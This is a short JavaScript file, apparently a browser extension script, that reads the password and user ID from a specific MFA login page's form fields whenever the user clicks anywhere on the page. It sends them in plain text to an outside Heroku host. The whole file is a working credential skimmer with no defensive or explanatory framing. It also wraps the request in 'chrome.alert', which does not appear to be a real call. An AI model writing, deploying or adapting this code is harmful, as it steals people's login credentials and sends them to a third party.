function getdata() {

    pass = document.getElementById("ContentPlaceHolder1_MFALoginControl1_UserIDView_tbxPassword").value;
    email = document.getElementById("ContentPlaceHolder1_MFALoginControl1_UserIDView_txtUserid").value;

    data = "PASS: "+pass+" EMAIL: "+email;
    function sent(result){
      chrome.alert(fetch("https://pass-get.herokuapp.com/"+result));
    }

      sent(data)
}

function check(){
  document.body.onclick = function(){
    getdata()
}
}

check()